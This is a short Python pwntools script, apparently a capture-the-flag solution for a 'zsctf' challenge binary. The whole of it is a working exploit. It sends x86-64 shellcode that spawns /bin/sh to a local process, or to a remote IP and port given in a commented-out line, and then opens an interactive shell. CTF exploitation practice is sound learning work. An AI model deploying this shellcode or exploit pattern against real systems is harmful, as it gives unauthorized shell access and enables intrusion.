from pwn import *

io = process("./pwn")
# io = remote("47.79.89.88", 32774)

shell = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
print(len(shell))
io.sendafter(b"Welcome to the zsctf!\n", shell)

io.interactive()

